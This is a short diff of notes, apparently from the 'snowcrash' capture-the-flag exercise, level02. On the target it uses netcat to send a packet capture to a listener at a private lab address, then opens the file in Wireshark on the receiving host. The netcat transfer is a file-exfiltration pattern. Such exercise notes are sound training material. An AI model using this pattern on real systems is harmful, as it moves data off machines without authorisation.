@@ -1,0 +1,7 @@
+[snowcrash]
+ls -la ~
+nc -w 3 192.168.1.5 1234 < level02.pcap
+
+[host]
+nc -l -p 1234 > level02.pcap
+wireshark -r level02.pcap
